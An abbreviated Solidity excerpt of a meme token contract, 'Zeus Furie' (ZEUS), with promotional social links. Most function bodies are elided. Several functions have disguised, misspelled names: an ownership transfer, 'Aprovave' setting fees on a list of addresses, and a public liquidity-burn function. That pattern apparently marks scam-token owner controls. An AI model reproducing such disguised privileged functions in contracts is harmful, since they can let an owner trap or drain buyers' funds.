...
/**
https://t.me/ZeusFurie_Coin
https://twitter.com/ZeusFurie_Erc
Zeus Furie - Pepe´s Dog
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipenfenrtyus(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract ZeusFurie is Ownable {
    ...
    constructor (){
        name = unicode"Zeus Furie";
        symbol = unicode"ZEUS";
        decimals = 9;
        uint256 Supply = 69042000000;
    ...
    function Aprovave(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqtenvfss(address user) public {
